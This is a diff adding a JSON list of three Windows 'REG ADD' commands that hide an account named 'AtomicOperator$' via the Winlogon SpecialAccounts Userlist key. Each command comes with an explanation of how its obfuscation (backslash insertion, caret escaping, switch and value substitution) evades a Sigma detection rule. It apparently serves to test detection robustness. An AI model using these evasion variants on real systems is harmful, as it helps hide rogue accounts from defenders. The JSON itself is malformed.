@@ -1,0 +1,14 @@
+[
+{
+"output": "REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0",
+"explanation": "Insertion technique: Injects an extra backslash character ('\\') into the registry path string. This breaks the contiguous literal path check specified in the rule, but Windows path normalization automatically resolves the double backslash down to a single delimiter, maintaining equivalent execution functionality."
+},
+{
+"output": "cmd.exe /c "REG a^dd "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0"",
+"explanation": "Insertion technique: Uses a caret escape character ('^') within the 'add' verb via cmd.exe execution. The command shell processes and strips the caret out, handing the normalized token to reg.exe, while the process logs capture the verbatim input, thus avoiding the rule's exact string condition for 'add'."
+},
+{
+"output": "REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -v AtomicOperator$ /t REG_DWORD /d 0x0",
+"explanation": "Substitution technique: Replaces the parameter switch format from '/v' to a hyphen-based '-v', and changes the data format value from '/d 0' to '/d 0x0'. Both modifications satisfy the executable's parsing routine identically but safely break two distinct explicit literal string criteria monitored by the Sigma rule's command line block."
+}
+]
